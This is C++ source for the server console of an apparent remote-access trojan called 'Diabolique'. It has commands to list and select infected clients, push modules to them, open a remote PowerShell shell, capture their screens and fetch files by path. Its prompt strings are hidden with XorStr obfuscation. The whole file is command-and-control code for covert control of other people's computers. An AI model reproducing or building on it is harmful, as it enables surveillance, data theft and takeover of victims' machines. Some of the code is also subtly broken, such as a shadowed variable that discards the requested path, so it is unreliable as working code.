
#include <IDiaboliqueServerInterface.h>
#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#include <iostream>

static std::string nonAlpha(std::string input)
{
    std::stringstream ss;
    for (int x = 0; x < input.size(); x++)
    {
        if (isalpha(input[x]))
        {
            ss << input[x];
        }
    }

    if (ss.str().length() > 0)
        return ss.str();
    else
        return "Nothing left";

}

void IDiaboliqueServerInterface::_INTRNL_HandleUserInputThread()
{
    while (true)
    {
        int nPos = 0;
        std::string input;
        std::getline(std::cin, input);
        //input += "\r\n";

        if ((input.c_str()[0] == ':'))
        {
            m_bSettingValues = !m_bSettingValues;
            if (m_bSettingValues)
            {
                printf(XorStr("Entering Server Settings\n"));
                printf(XorStr("> "));
            }
            else
            {
                printf(XorStr("Entering Module Passthrough Mode\n"));
            }

            input.erase(0, 1);

            if(!input.size())
                continue;
        }

        if (!m_bSettingValues)
        {
            server_module_preprocessors_t preprocessor;
            auto map = m_Server.GetCurrentClientModuleMap();

            if (map.find(m_nCurrentModule) == map.end())
            {
                printf("Bad Module Index %d for client %d\n", m_nCurrentModule, m_Server.GetCurrentClient());
                continue;
            }

            if (GetPreProcessor((int)map[m_nCurrentModule], preprocessor) && preprocessor.m_UserPassthrough)
                preprocessor.m_UserPassthrough(&input);

            m_Server.SendModuleMessageToCurrentClient(m_nCurrentModule, input.data(), input.length());
            continue;
        }

        //input = nonAlpha(input);




        std::string command = FindNextField(input, nPos, &nPos);


        for (const auto& cmd : m_Commands)
        {
            if (!command.compare(cmd.first))
            {
                auto pfnCommandFunc = cmd.second;
                (*this.*pfnCommandFunc)(input, &nPos);
                break;
            }
        }

        printf(XorStr("> "));
    }
}


std::string IDiaboliqueServerInterface::PromptIfEmpty(std::string str, const char* szPrompt, int nOffset, int* nPos)
{
    std::string field = "";
    if (!(nOffset == -1))
        field = FindNextField(str, nOffset, nPos);

    if (!field.size())
    {
        printf("%s", szPrompt);
        std::getline(std::cin, field);
    }

    return field;
};

std::string IDiaboliqueServerInterface::FindNextField(std::string str, int nOffset, int* nPos){

    *nPos = -1;

    for (int i = nOffset; i < str.size(); i++)
    {
        if (str.c_str()[i] == ' ')
        {
            *nPos = (i + 1);
            return str.substr(nOffset, i - nOffset);
        }
    }


    return str.substr(nOffset, str.size() - nOffset);
};


bool IDiaboliqueServerInterface::SetModuleCommand(std::string command, int* nPos)
{
    command = PromptIfEmpty(command, XorStr("Module Index > "), *nPos, nPos);
    m_nCurrentModule = atoi(command.c_str());
    printf("Selecting Module %d\n", m_nCurrentModule);
    return true;
}


bool IDiaboliqueServerInterface::SetClientCommand(std::string input, int* nPos)
{
    input = PromptIfEmpty(input, XorStr("Client Index > "), *nPos, nPos);
    int nModule = atoi(input.c_str());
    m_Server.SetCurrentClient(nModule);
    printf("Selecting Client %d\n", nModule);
    return true;
}

bool IDiaboliqueServerInterface::SetDumpClientsCommand(std::string command, int* nPos)
{
    auto clis = m_Server.GetClients();
    for (const auto& clindex : clis)
    {
#if defined(SERVER) || defined(DEBUG) || defined(SERVER_CLIENT)
        printf("conn | %d : %s\n", clindex, m_Server.GetConnectionName(clindex).c_str());
#else
        printf("conn | %d\n", clindex);
#endif
    }

    printf("\n");
    return true;
}

bool IDiaboliqueServerInterface::AddModuleCommand(std::string input, int* nPos)
{
    input = PromptIfEmpty(input, XorStr("Module Type > "), *nPos, nPos);
    DiaboliqueModuleType_t nType = (DiaboliqueModuleType_t)atoi(input.c_str());

    create_module create_message;
    create_message.set_type((int32_t)nType);

    m_Server.SendMessageToCurrentClient(diabolique_message_type_t::k_dmSTCCreateModule, &create_message);
    return true;
}
bool IDiaboliqueServerInterface::ShellCommand(std::string input, int* nPos)
{
    create_module create_message;
    create_message.set_type((int32_t)DiaboliqueModuleType_t::k_dmtPowershellPassthrough);

    m_Server.SendMessageToCurrentClient(diabolique_message_type_t::k_dmSTCCreateModule, &create_message);
    m_bSettingValues = false;

    return true;
}

bool IDiaboliqueServerInterface::DumpModulesCommand(std::string input, int* nPos)
{
    server_module_preprocessors_t preprocessor;
    auto map = m_Server.GetCurrentClientModuleMap();

    for (const auto& mod : map)
    {
        if (GetPreProcessor((int)map[m_nCurrentModule], preprocessor))
            printf("%d -> %s (%d)\n", mod.first, ModuleTypeToString(mod.second).c_str(), mod.second);
        else
            printf("%d -> %d, No Preprocessor data!\n", mod.first, mod.second);
    }
    return true;
}

bool IDiaboliqueServerInterface::InitModuleCommand(std::string input, int* nPos)
{
    server_module_preprocessors_t preprocessor;
    auto map = m_Server.GetCurrentClientModuleMap();

    if (map.find(m_nCurrentModule) == map.end())
    {
        printf("No Module Found Under Index %d\n> ", m_nCurrentModule);
        return false;
    }

    if (!GetPreProcessor((int)map[m_nCurrentModule], preprocessor))
    {
        printf("No Module Preprocess Data Found For %d\n> ", m_nCurrentModule);
        return false;
    }

    if (!preprocessor.m_GenerateInitializationData)
    {
        printf("No Module Initializer Generator Found For %d\n> ", m_nCurrentModule);
        return false;
    }
    void* pMemory = nullptr;
    size_t nDataSize = 0;

    printf("Initializing Current Module %d (%s)\n", m_nCurrentModule, ModuleTypeToString(map[m_nCurrentModule]).c_str());

    preprocessor.m_GenerateInitializationData(input, &pMemory, nDataSize);


    initialize_module init_message;

    init_message.set_module_index(m_nCurrentModule);


    if (pMemory && nDataSize)
        init_message.set_init_data(std::string((char*)pMemory, nDataSize));
    else
        init_message.set_init_data("na");

    printf("Sending Init, Entering Passthrough Mode\n");
    m_Server.SendMessageToCurrentClient(
        diabolique_message_type_t::k_dmSTCInitializeModule,
        &init_message
    );
    m_bSettingValues = false;
    return true;
}



bool IDiaboliqueServerInterface::ListValidServerModules(std::string input, int* nPos)
{
    bool bValid = true;
    int i = 0;
    while (bValid)
    {
        std::string type = ModuleTypeToString((DiaboliqueModuleType_t)i, &bValid);
        if (!bValid)
            break;

        printf("[MODULE TYPE Index/Name] | %d : %s\n", i, type.c_str());
        i++;
    }

    return true;
}


bool IDiaboliqueServerInterface::StartScreenCapture(std::string input, int* nPos)
{


    screen_capture_startup scap;
    std::string str = PromptIfEmpty(input, XorStr("Ticks Per Second > "), *nPos, nPos);
    scap.set_ticks_between(std::atoi(str.c_str()));


    str = PromptIfEmpty(input, XorStr("Width > "), *nPos, nPos);
    int x = std::atoi(str.c_str());
    str = PromptIfEmpty(input, XorStr("Height > "), *nPos, nPos);
    int y = std::atoi(str.c_str());


    printf("Starting Screen Capture!\n");
    m_Server.SendMessageToCurrentClient(
        diabolique_message_type_t::k_dmSTCScreenCapStartup,
        &scap
    );

    m_Server.InitializeScreenCaptureWindow(x , y);

    return true;
}


bool IDiaboliqueServerInterface::DisconnectClient(std::string input, int* nPos)
{
    m_Server.RemoveClient(m_Server.GetCurrentClient());   
    return true;
}

bool IDiaboliqueServerInterface::RequestFile(std::string input, int* nPos)
{
    std::string str = "";

    std::string field = FindNextField(input, *nPos, nPos);
    str += field;
    if (*nPos != -1)
    {
        field = FindNextField(input, *nPos, nPos);
        for (; !field.empty() && (!*nPos != -1); field = FindNextField(input, *nPos, nPos))
        {
            str += " " + field;
            if (*nPos == -1)
                break;
        }
    }

    if(str.empty())
        std::string str = PromptIfEmpty(input, XorStr("Path > "), *nPos, nPos);

    file_server_request req;
    req.set_path(str);

    m_Server.SendMessageToCurrentClient(diabolique_message_type_t::k_dmSTCRequestFile, &req);

    return true;
}


#endif